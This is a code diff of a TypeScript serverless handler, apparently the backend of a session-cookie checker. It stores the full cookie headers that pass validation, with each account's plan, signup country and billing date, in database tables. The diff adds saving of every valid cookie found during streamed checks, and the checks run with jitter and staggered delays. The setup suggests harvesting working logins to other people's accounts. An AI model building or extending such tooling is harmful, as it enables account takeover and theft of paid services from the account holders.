@@ -37,7 +37,7 @@ async function savePassedCheckAudits(
   const passed = (results || []).filter((r) => r?.valid);
   if (!passed.length) return;
 
-  const rows = passed.map((item) => ({
+  const liveRows = passed.map((item) => ({
     account_id: item.accountId || crypto.randomUUID(),
     status: "passed",
     cookie_header: item.cookieHeader || null,
@@ -47,26 +47,72 @@ async function savePassedCheckAudits(
     expires_at: item.nextBillingRaw || null,
   }));
 
-  const { error } = await supabase.from("live_checks").insert(rows);
+  const { error: liveError } = await supabase.from("live_checks").insert(liveRows);
 
-  const cookieRows = passed.map((item) => ({
-    account_id: item.accountId || crypto.randomUUID(),
-    cookie_header: item.cookieHeader || null,
-    plan: item.plan || null,
-    country: item.countryOfSignup || null,
-    checked_at: new Date().toISOString(),
-  }));
+  if (liveError) {
+    console.error("savePassedCheckAudits live_checks error:", liveError.message);
+  }
+
+  const cookieRows = passed
+    .filter((item) => item?.cookieHeader)
+    .map((item) => ({
+      account_id: item.accountId || crypto.randomUUID(),
+      cookie_header: item.cookieHeader || null,
+      plan: item.plan || null,
+      country: item.countryOfSignup || null,
+      checked_at: new Date().toISOString(),
+    }));
+
+  if (cookieRows.length > 0) {
+    const { error: cookieError } = await supabase
+      .from("cookies")
+      .upsert(cookieRows, { onConflict: "cookie_header" });
+
+    if (cookieError) {
+      console.error("save cookies error:", cookieError.message);
+    }
+  }
+}
+
+async function saveStreamValidCookie(cookieHeader: string) {
+  if (!cookieHeader) return;
+
+  const checkedAt = new Date().toISOString();
+  const accountId = crypto.randomUUID();
+
+  const { error: liveError } = await supabase.from("live_checks").insert([
+    {
+      account_id: accountId,
+      status: "passed",
+      cookie_header: cookieHeader,
+      plan: null,
+      country: null,
+      checked_at: checkedAt,
+      expires_at: null,
+    },
+  ]);
+
+  if (liveError) {
+    console.error("stream live_checks insert error:", liveError.message);
+  }
 
   const { error: cookieError } = await supabase
     .from("cookies")
-    .upsert(cookieRows, { onConflict: "cookie_header" });
+    .upsert(
+      [
+        {
+          account_id: accountId,
+          cookie_header: cookieHeader,
+          plan: null,
+          country: null,
+          checked_at: checkedAt,
+        },
+      ],
+      { onConflict: "cookie_header" }
+    );
 
   if (cookieError) {
-    console.error("save cookies error:", cookieError.message);
-  }
-
-  if (error) {
-    console.error("savePassedCheckAudits error:", error.message);
+    console.error("stream cookies upsert error:", cookieError.message);
   }
 }
 
@@ -152,21 +198,8 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       delayMs: 500,
       randomJitter: true,
       staggerMs: 300,
-      onValidCookie: async (_cookieHeader: string) => {
-        const { error } = await supabase.from("live_checks").insert([
-          {
-            account_id: crypto.randomUUID(),
-            status: "passed",
-            plan: null,
-            country: null,
-            checked_at: new Date().toISOString(),
-            expires_at: null,
-          },
-        ]);
-
-        if (error) {
-          console.error("stream audit insert error:", error.message);
-        }
+      onValidCookie: async (cookieHeader: string) => {
+        await saveStreamValidCookie(cookieHeader);
       },
     };
 
